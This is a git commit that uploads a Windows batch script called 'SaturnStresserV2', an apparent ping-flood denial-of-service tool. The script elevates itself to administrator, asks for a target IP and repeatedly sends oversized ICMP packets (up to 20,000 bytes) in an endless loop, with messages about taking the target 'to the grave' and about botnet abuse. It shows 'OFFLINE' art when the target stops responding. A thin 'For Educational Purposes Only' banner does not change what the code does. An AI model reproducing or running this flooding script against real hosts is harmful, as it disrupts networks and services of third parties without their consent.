8218c0b3b053dfd4249e8cfe576295fb583e6822
zyx <162206609+zyxcompare@users.noreply.github.com>
2024-03-12 00:04:38 -0400

    Add files via upload

---
+++ SaturnStresserV2.bat
@@ -0,0 +1,148 @@
+:iplook
+@echo off
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+set g=[92m
+set black=[30m
+set white=[47m
+set r=[91m
+set red=[04m
+set l=[1m
+set w=[0m
+set b=[94m
+set m=[95m
+set p=[35m
+set c=[35m
+set d=[96m
+set q=[37m
+set u=[0m
+set z=[91m
+set n=[96m
+set y=[40;33m
+set g2=[102m
+set r2=[101m
+set t=[40m
+set bo=[01m
+set y1=[33m
+set y2=[93m
+title DeltaLookup Tool v.2.1 by @zyxcompare
+color e
+title Made by @zyxcompare
+mode con cols=130 lines=38
+echo.
+echo                       %y1%^^^^^^:::....                                                                               
+echo                      :?:.::::^^::^^^^^^^^^^:...                                                                       
+echo                       ~~.::^:..::.::.:::::^^^^~^^::..     ..:^~~~~~~~~~^^:.                                           
+echo                        :!^^~  ^::^:::::.:::::::^^^~~~~^^~!~^::..      ..:^~~~^.                                       
+echo                         ^!~~:..:~. ::^::.:^^^^::::::~77~.  ...             .^~~~.                                    
+echo                           .^!!^::.^^..~:.:?::::^^~^~7!:. ...                    :!~.                                  
+echo                              ^!~^^.:^^^~^:!!.     ^?^ ....                        :7~                                 
+echo                                :~~~^:..^^^:~7~.  :7. ......                         ^7:                               
+echo                                  .^~~~:..::^~~!~^?.........                          :?.                              
+echo                                     .^~~~:..::::^^.~~^......                          ^?                              
+echo                                        :^~~^:..::::^~!!!~^:..                          ?.                             
+echo                                           .^~~^::::::::^^~!!~:.                        ?!.                            
+echo                                              .:^!~^:::.::::^~!~~:                     :Y!7~:.                         
+echo                                                 ^J:~~~^:::::::^^~!~:.                .J^.^~!!~^:                      
+echo                                                  ~7: .^~~~~~^:::::~~!~~^:.           7~:^^:.:^~~!^:.                  
+echo                                                   :!~.  .:^~~!~^^::::^^^^^~~^:..   :7^   :~~:..:^^~~~:                
+echo                                                     :!~:   ...:^~~~^::::::::^^~~~~!J^...   .~7^:.:.:^~~^.             
+echo                 _____       __                        .^~~:.    ..:^~~~^^^:::..:::^^^^^~~~~~~7:^.::.:^:^~~:           
+echo                / ___/____ _/ /___  ___________           .^^~^^:..    ..:^^^~^::...:::::::...::...^ .::^:^~~^.        
+echo                \__ \/ __ `/ __/ / / / ___/ __ \              ..^~~~^^^^^^^~~!~:^^^:::...........:..... ^..^^^~~^      
+echo               ___/ / /_/ / /_/ /_/ / /  / / / /                      ......     ..::^^^^^::...........:. ::^:^~!^    
+echo              /____/\__,_/\__/\__,_/_/  /_/ /_/                                       ...::^^^^^^::....::..^. ^.^!.  
+echo                                                                                               .::^^^^^::::...:. 7:  
+echo                                                                                                    .:::^^^^^^^~: 
+echo. 
+echo.
+echo                                                     For Educational Purposes Only
+echo.
+echo.                   
+echo                                                      S a t u r n _ S t r e s s e r
+echo.
+echo.
+echo.
+:hub
+set /p var=[+] Enter IP  
+echo Preparing To Take ~%var%~ To The Grave
+TIMEOUT /T 3 /NOBREAK
+title Preparing To Take ~%var%~ To The Grave
+echo ================================
+echo Pinging Target IP "%var%"
+echo ================================
+:d
+echo ==================================
+echo %var% sta subendo l'abuso da Parte della Botnet
+echo ==================================
+:x
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 20000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 15000 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+ping  -l 9999 -w 1 -n 1 %var% | FIND "TTL="
+IF ERRORLEVEL 1 goto f
+color e
+cls
+GoTo d
+:f
+color 40            
+echo  _____  ____  ____  __    ____  _  _  ____ 
+echo (  _  )( ___)( ___)(  )  (_  _)( \( )( ___)
+echo )(_)(  )__)  )__)  )(__  _)(_  )  (  )__) 
+echo (_____)(__)  (__)  (____)(____)(_)\_)(____)                          
+color 04
+goto x
